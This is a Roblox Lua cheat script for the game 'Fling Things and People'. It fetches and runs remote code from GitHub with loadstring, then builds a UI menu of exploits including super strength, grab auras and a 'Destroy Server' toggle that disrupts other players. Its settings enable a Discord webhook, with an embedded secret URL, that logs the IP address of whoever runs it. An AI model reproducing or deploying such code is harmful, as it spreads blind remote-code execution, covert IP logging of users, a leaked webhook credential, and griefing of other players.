-- Example with UI, you can use any UI library

-- Load the FTAP API module
local ApiFTAP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Oxwoey/FTAP-Module/refs/heads/main/Module/ModuleFTAP"))()

-- Load the UI library
local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Oxwoey/ElysiumHub/refs/heads/main/El"))()

-- Create a UI window
local Window = OrionLib:MakeWindow({
    Name = "Elysium FTAP",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "ElysiumConfig"
})

ApiFTAP:Blacklist({
    BlacklistToggle = false, -- Enable or disable
    Url = "https://pastebin.com/raw/JYvCaxAV",-- Your GitHub or Pastebin URL
    KickText = "idi nahyi" -- Kick Text
})

ApiFTAP:SetSettings({
    NameHub = "Elysium Hub", -- Name of the hub (used for identification)
    WebhookEnabled = true, -- Enable or disable webhook functionality
    ExecuteLogSecret = true, -- Enable or disable IP logging (use with caution)
    WebhookLink = "https://discordapp.com/api/webhooks/1358066417106419772/f7Dis53P277JbOiVnBcR5SSARCgbQMobV9Vrui4HZqNdtihXNUoIwwjqku5qEnQ-G9QT" -- Your Discord webhook URL
})

-- Create the main tab
local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})


Tab:AddToggle({
    Name = "Anti Grab",
    Default = false,
    Callback = function(Value)
        ApiFTAP.AntiGrab(Value)
    end
})

Tab:AddToggle({
    Name = "Anti Void",
    Default = false,
    Callback = function(Value)
        ApiFTAP.AntiVoid(Value)
    end
})

-- Combat functions section
local CombatSection = Tab:AddSection({
    Name = "Combat"
})

CombatSection:AddToggle({
    Name = "Super Strength",
    Default = false,
    Callback = function(Value)
        ApiFTAP.SuperStrength(Value)
    end
})

CombatSection:AddSlider({
    Name = "Strength Value",
    Min = 0,
    Max = 1000,
    Default = ApiFTAP.ValueStrength(), -- Default should be obtained from the API
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 1,
    ValueName = "Strength",
    Callback = function(Value)
        ApiFTAP.ValueStrength(Value)
    end
})

CombatSection:AddToggle({
    Name = "Burn Grab",
    Default = false,
    Callback = function(Value)
        ApiFTAP.BurnGrab(Value)
    end
})

-- Aura functions section
local AuraSection = Tab:AddSection({
    Name = "Aura"
})

AuraSection:AddToggle({
    Name = "Magnetic Aura",
    Default = false,
    Callback = function(Value)
        ApiFTAP.MagneticAura(Value)
    end
})

AuraSection:AddToggle({
    Name = "Aura Whitelist",
    Default = false,
    Callback = function(Value)
        ApiFTAP.AuraWhiteList(Value)
    end
})

-- Line functions section
local LineSection = Tab:AddSection({
    Name = "Line"
})

LineSection:AddToggle({
    Name = "RGB Line",
    Default = false,
    Callback = function(Value)
        ApiFTAP.RbgLine(Value)
    end
})

-- Blobman functions section
local BlobmanSection = Tab:AddSection({
    Name = "Blobman"
})

BlobmanSection:AddToggle({
    Name = "Destroy Server",
    Default = false,
    Callback = function(Value)
        ApiFTAP.DestroyServer(Value)
    end
})

BlobmanSection:AddToggle({
    Name = "Whitelist (Ignore Friends)",
    Default = false,
    Callback = function(Value)
        ApiFTAP.DestroyServerWhite(Value)
    end
})


OrionLib:Init()
